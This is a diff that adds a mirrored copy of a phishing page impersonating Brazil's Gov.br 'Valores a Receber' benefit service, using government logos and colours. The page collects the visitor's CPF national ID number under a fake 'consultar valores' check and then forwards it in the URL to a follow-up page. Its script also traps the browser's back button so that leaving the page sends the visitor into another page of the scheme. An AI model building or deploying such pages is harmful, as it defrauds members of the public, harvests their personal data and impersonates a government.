@@ -1,0 +1,610 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from valoresareceber2026.vercel.app/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2026 22:06:09 GMT --><!-- Added by HTTrack -->
+<!-- Mirrored from valores-recebergv2.online/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Oct 2026 21:00:21 GMT -->
+<head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - LOGIN</title>
+  <link rel="icon" href="favic.html" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    var urlBackRedirect = '../back/index.html'.trim() + ('./back/index.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '');
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () { setTimeout(function () { location.href = urlBackRedirect; }, 1); };
+  </script>
+  <style>
+    :root {
+      --gov-blue-primary: #1351B4;
+      --gov-blue-secondary: #0F4DA8;
+      --gov-blue-light: #E8F4FD;
+      --gov-blue-dark: #0C326F;
+      --gov-green: #168821;
+      --gov-orange: #FF7A00;
+      --gov-gray-light: #F8F9FA;
+      --gov-gray-medium: #E5E5E5;
+      --gov-gray-dark: #495057;
+      --gov-white: #FFFFFF;
+      --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
+      --border-radius: 8px;
+      --transition: all 0.3s ease;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, var(--gov-blue-light) 0%, var(--gov-white) 100%);
+      min-height: 100vh;
+      color: var(--gov-gray-dark);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      font-feature-settings: 'kern' 1, 'liga' 1;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    header {
+      background: var(--gov-white);
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: var(--gov-shadow);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      border-bottom: 3px solid var(--gov-blue-primary);
+    }
+
+    header .logo {
+      display: flex;
+      align-items: center;
+    }
+
+    header .logo img {
+      height: 40px;
+      width: auto;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+    }
+
+    header .logo-text {
+      margin-left: 16px;
+      font-size: 18px;
+      font-weight: 500;
+      color: var(--gov-blue-primary);
+    }
+
+    header .icons {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    header .icons button {
+      background: none;
+      border: none;
+      padding: 8px;
+      cursor: pointer;
+      border-radius: 50%;
+      transition: var(--transition);
+      color: var(--gov-blue-primary);
+    }
+
+    header .icons button:hover {
+      background: var(--gov-blue-light);
+      transform: translateY(-1px);
+    }
+
+    header .icons button i {
+      font-size: 16px;
+    }
+
+    header .user {
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      border: none;
+      border-radius: 25px;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      font-weight: 500;
+      transition: var(--transition);
+      box-shadow: var(--gov-shadow);
+    }
+
+    header .user:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--gov-shadow-hover);
+    }
+
+    nav {
+      background: var(--gov-white);
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--gov-gray-medium);
+    }
+
+    nav button {
+      background: none;
+      border: none;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      padding: 8px 12px;
+      border-radius: var(--border-radius);
+      transition: var(--transition);
+    }
+
+    nav button:hover {
+      background: var(--gov-gray-light);
+    }
+
+    nav button i {
+      font-size: 16px;
+      color: var(--gov-blue-primary);
+      margin-right: 8px;
+    }
+
+    nav button p {
+      color: var(--gov-gray-dark);
+      font-size: 14px;
+      font-weight: 400;
+      margin: 0;
+    }
+
+    nav button span {
+      color: var(--gov-blue-primary);
+      font-weight: 500;
+    }
+
+    .carousel {
+      width: 100%;
+      overflow: hidden;
+      background: var(--gov-white);
+      border-radius: var(--border-radius);
+      margin: 20px 0;
+      box-shadow: var(--gov-shadow);
+    }
+
+    .carousel-inner {
+      display: flex;
+      transition: transform 0.5s ease-in-out;
+    }
+
+    .carousel-inner img {
+      width: 100%;
+      max-width: 720px;
+      height: auto;
+      object-fit: cover;
+      display: block;
+    }
+
+    .conteudo {
+      max-width: 480px;
+      margin: 40px auto;
+      padding: 0 20px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .conteudo-inner {
+      background: var(--gov-white);
+      padding: 40px;
+      border-radius: 16px;
+      border: 1px solid var(--gov-gray-medium);
+      box-shadow: var(--gov-shadow-hover);
+      position: relative;
+      overflow: hidden;
+      animation: fadeInUp 0.6s ease-out;
+    }
+
+    .conteudo-inner::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+    }
+
+    .titulo-section {
+      font-size: 24px;
+      color: var(--gov-blue-dark);
+      margin-bottom: 24px;
+      text-align: center;
+      font-weight: 700;
+      position: relative;
+    }
+
+    .titulo-section::after {
+      content: '';
+      position: absolute;
+      bottom: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60px;
+      height: 3px;
+      background: var(--gov-blue-primary);
+      border-radius: 2px;
+    }
+
+    .container-form {
+      text-align: center;
+      border: 0;
+      padding: 0;
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+      margin: 0 auto;
+    }
+
+    .container-form label {
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 8px;
+      font-size: 16px;
+      color: var(--gov-blue-dark);
+    }
+
+    .container-form .icon {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      filter: brightness(0) saturate(100%) invert(20%) sepia(95%) saturate(1500%) hue-rotate(213deg) brightness(90%) contrast(95%);
+    }
+
+    .container-form p {
+      text-align: center;
+      margin-bottom: 8px;
+      color: var(--gov-gray-dark);
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .container-form .highlight {
+      font-weight: 600;
+      color: var(--gov-blue-primary);
+    }
+
+    .container-form .input-label {
+      margin: 16px 0;
+      font-size: 14px;
+      color: var(--gov-gray-dark);
+      background: var(--gov-blue-light);
+      padding: 12px;
+      border-radius: var(--border-radius);
+      border-left: 4px solid var(--gov-blue-primary);
+    }
+
+    .input-group {
+      position: relative;
+      margin: 20px 0;
+    }
+
+    .input-group label {
+      position: absolute;
+      top: -8px;
+      left: 12px;
+      background: var(--gov-white);
+      padding: 0 8px;
+      font-size: 12px;
+      color: var(--gov-blue-primary);
+      font-weight: 500;
+      z-index: 1;
+    }
+
+    .container-form input {
+      padding: 16px;
+      width: 100%;
+      box-sizing: border-box;
+      border: 2px solid var(--gov-gray-medium);
+      border-radius: var(--border-radius);
+      font-size: 16px;
+      font-family: 'Roboto', sans-serif;
+      transition: var(--transition);
+      background: var(--gov-white);
+    }
+
+    .container-form input:focus {
+      outline: none;
+      border-color: var(--gov-blue-primary);
+      box-shadow: 0 0 0 3px rgba(19, 81, 180, 0.1);
+      transform: translateY(-1px);
+    }
+
+    .container-form input::placeholder {
+      color: #999;
+      font-style: normal;
+    }
+
+    .container-form button {
+      padding: 16px 32px;
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      border: none;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 16px;
+      margin-top: 24px;
+      transition: var(--transition);
+      box-shadow: var(--gov-shadow);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .container-form button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .container-form button:hover::before {
+      left: 100%;
+    }
+
+    .container-form button:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--gov-shadow-hover);
+    }
+
+    .container-form button:active {
+      transform: translateY(0);
+    }
+
+    .container-form button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .error-message {
+      color: #dc3545;
+      margin: 12px 0;
+      font-size: 14px;
+      text-align: center;
+      background: #f8d7da;
+      border: 1px solid #f5c6cb;
+      border-radius: var(--border-radius);
+      padding: 12px;
+      border-left: 4px solid #dc3545;
+      font-weight: 500;
+    }
+
+    .terms-section {
+      margin-top: 40px;
+      padding-top: 24px;
+      border-top: 1px solid var(--gov-gray-medium);
+      text-align: center;
+    }
+
+    .terms-section h2 {
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: var(--gov-blue-primary);
+      font-weight: 500;
+    }
+
+    footer {
+      background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38);
+      color: var(--gov-white);
+      text-align: center;
+      padding: 40px 24px;
+      font-size: 14px;
+      margin-top: auto;
+      flex-shrink: 0;
+    }
+
+    footer .footer-logo {
+      width: 120px;
+      margin-bottom: 16px;
+      filter: brightness(0) invert(1);
+    }
+
+    footer .copy p {
+      margin: 0 0 8px 0;
+      opacity: 0.9;
+    }
+
+    footer .copy span {
+      font-size: 12px;
+      opacity: 0.8;
+    }
+
+    @media (max-width: 768px) {
+      header {
+        padding: 12px 16px;
+      }
+
+      header .logo img {
+        height: 32px;
+      }
+
+      header .logo-text {
+        font-size: 16px;
+      }
+
+      .conteudo {
+        margin: 20px auto;
+        padding: 0 16px;
+        justify-content: flex-start;
+        min-height: auto;
+      }
+
+      .conteudo-inner {
+        padding: 24px;
+        border-radius: 12px;
+      }
+
+      .titulo-section {
+        font-size: 20px;
+      }
+
+      nav {
+        padding: 8px 16px;
+      }
+
+      nav button p {
+        font-size: 12px;
+      }
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .conteudo-inner {
+      animation: fadeInUp 0.6s ease-out;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="logo">
+      <img src="images/2560px-Gov.br_logo.svg.png" alt="Gov.br">
+    </div>
+    <div class="icons">
+      <button title="Menu"><i class="fas fa-ellipsis-v"></i></button>
+      <button title="Configurações"><i class="fas fa-cog"></i></button>
+      <button title="Aplicativos"><i class="fas fa-th"></i></button>
+    </div>
+  </header>
+  <nav>
+    <button>
+      <i class="fas fa-bars"></i>
+      <p>Benefício <span> › </span> Valores a Receber <span> › </span> Acessar Usuário</p>
+    </button>
+    <button title="Buscar">
+      <i class="fas fa-search"></i>
+    </button>
+  </nav>
+  <div class="carousel">
+    <div class="carousel-inner">
+      <img src="images/slide-2.png" alt="Slide 1">
+    </div>
+  </div>
+  <div class="conteudo">
+    <div class="conteudo-inner">
+      <h2 class="titulo-section">Consulte Valores a Receber </h2>
+      <div class="container-form">
+        <form id="cpfForm">
+          <label for="cpf">
+            <img decoding="async" src="images/01.png" class="icon" alt="CPF Ícone">
+            Número do CPF
+          </label>
+          <div class="input-label">
+            Digite seu CPF para <span class="highlight">consultar</span> quanto tem disponível para receber.
+          </div>
+          <div class="input-group">
+            <label for="cpf">CPF</label>
+            <input type="tel" id="cpf" name="cpf" placeholder="000.000.000-00" required="">
+          </div>
+          <p id="error-msg" class="error-message" style="display: none;"></p>
+          <button type="submit" id="submit-btn">
+            <i class="fas fa-search" style="margin-right: 8px;"></i>
+            Consultar Valores
+          </button>
+          <input type="hidden" name="utm_source" value="">
+          <input type="hidden" name="utm_campaign" value="">
+          <input type="hidden" name="utm_medium" value="">
+          <input type="hidden" name="utm_content" value="">
+        </form>
+      </div>
+
+    </div>
+  </div>
+  <footer>
+    <img src="images/logo.png" class="footer-logo" alt="Logo">
+    <div class="copy">
+      <p>Todo o conteúdo deste site está publicado sob a licença</p>
+      <span>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada</span>
+    </div>
+  </footer>
+  <script>
+    function removeMask(cpf) { return cpf.replace(/\D/g, ''); }
+    function formatCPF(cpf) {
+      let digits = removeMask(cpf);
+      return digits.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+    }
+    function isValidCPF(cpf) {
+      cpf = removeMask(cpf);
+      if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
+      let sum = 0, remainder;
+      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+      sum = 0;
+      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+      return true;
+    }
+    const cpfInput = document.getElementById('cpf');
+    const errorMsg = document.getElementById('error-msg');
+    const submitBtn = document.getElementById('submit-btn');
+    cpfInput.addEventListener('input', () => { cpfInput.value = formatCPF(cpfInput.value); });
+    document.getElementById('cpfForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      errorMsg.style.display = 'none';
+      let originalText = submitBtn.textContent;
+      submitBtn.textContent = 'Consultando...';
+      let cpfValue = removeMask(cpfInput.value);
+      if (!isValidCPF(cpfValue)) {
+        errorMsg.textContent = 'ERRO: CPF INVÁLIDO. Digite novamente.';
+        document.getElementById('cpf').value = '';
+        errorMsg.style.display = 'block';
+        submitBtn.textContent = originalText;
+        return;
+      }
+      // Aqui você pode adicionar a lógica de consulta/validação do CPF
+      setTimeout(() => {
+        submitBtn.textContent = originalText;
+        // Redirecionar ou mostrar mensagem de sucesso
+        let newQueryParams = new URLSearchParams(window.location.search);
+        newQueryParams.set('cpf', cpfValue);
+        for (let [key, value] of newQueryParams.entries()) { if (!value.trim()) { newQueryParams.delete(key); } }
+        window.location.href = 'consultad41d.html?' + newQueryParams.toString();
+      }, 1500);
+    });
+  </script>
+
+
+
+
+</body><!-- Mirrored from valoresareceber2026.vercel.app/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2026 22:06:10 GMT -->
+<!-- Mirrored from valores-recebergv2.online/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Oct 2026 21:00:23 GMT -->
+</html>
